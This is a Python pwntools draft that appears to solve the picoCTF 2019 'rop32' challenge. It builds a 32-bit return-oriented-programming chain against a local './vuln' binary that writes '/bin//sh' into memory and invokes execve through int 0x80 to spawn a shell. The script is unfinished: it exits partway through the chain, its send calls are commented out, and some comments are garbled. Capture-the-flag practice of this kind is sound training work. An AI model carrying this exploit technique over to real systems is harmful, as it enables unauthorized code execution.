#coding: utf-8

# debug: https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/rop32.md

from pwn import *
from struct import pack

proc = process("./vuln")
#p = p32(0x41)

#for z in range(27):
#    p += p32(0x41)

p = b"A" * 28

#p += pack('<I', 0x0806ee6b).encode("hex") # pop edx
p += p32(0x0806ee6b) # pop edx

p += pack("<I", 0x080da060) # edx <- .data address

#p += pack("<I", 0x080a8e36) # pop eax bad char \x0a 
p += pack("<I", 0x080c249f)
p += b'/bin' # eax <- '/bin'

p += pack("<I", 0x08056e65) # write "/bin" with the mov dword [edx], eax
p += pack("<I", 0x0806ee6b) # pop edx
p += pack("<I", 0x080da064) # edx <- eax

print(p)
exit(1)

p += pack("<I", 0x080a8e35) # pop eax
p += b'//sh'
p += pack("<I", 0x08056e65) # write "/sh" with the mov dword [edx], eax

p += pack("<I", 0x0806ee6b) # pop edx
p += pack("<I", 0x080da068) # edx = .data + 8 (just after /bin/sh

p += pack("<I", 0x08056420) # xor eax; eax

p += pack("<I", 0x08056e65 ) # mov dword ptr [edx], eax -> add null byte

p += pack("<I", 0x080481c9) # pop ebx
p += pack("<I", 0x080da060) # .data address that contain "/bin/sh" followed by \x00

p += pack("<I", 0x0806ee92) # pop ecx; pop edx
p += pack("<I", 0x00000000) # ecx = 0
p += pack("<I", 0x00000000) # edx = 0 

p += pack("<I", 0x08056420) # xor eax; eax

for x in range(11):
    p += pack("<I", 0x0807c2fa) # inc eax

p += pack("<I", 0x0806f79f) # int 0x80

print(p)

#proc.sendline(p)
#proc.interactive()

#eip = "CCCC"
#payload = pad + eip
#proc.sendline(payload)

